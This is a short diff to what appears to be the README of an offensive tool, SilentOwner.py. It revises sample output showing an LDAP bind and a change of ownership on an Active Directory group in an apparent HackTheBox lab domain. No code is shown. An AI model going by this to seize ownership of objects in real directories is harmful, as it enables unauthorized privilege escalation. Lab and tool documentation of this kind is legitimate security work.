@@ -59,10 +59,10 @@ python3 SilentOwner.py \
 🛡️ SilentOwner is live — scanning for target object ownership...
 
 [+] LDAP bind successful.
-[DEBUG] Raw sd['OwnerSid']: b'\x01\x00\x00...'
-[+] Current owner: S-1-5-21-729746778-2675978091-3820388244-1104
+[DEBUG] Raw sd['OwnerSid']: b'\x01\x00\x00\x8c\x14\x00\x00\x00\x00\x00\x0'
+[+] Current owner: S-1-5-21-729746778-2675978091-3820388244-1103
 [+] Replacing owner with: S-1-5-21-729746778-2675978091-3820388244-1103
-[✅] Ownership of CN=Management,CN=Users,DC=certified,DC=htb successfully changed
+[✅] Ownership of CN=Management,CN=Users,DC=certified,DC=htb successfully changed to S-1-5-21-729746778-2675978091-3820388244-1103
 ```
 
 ---
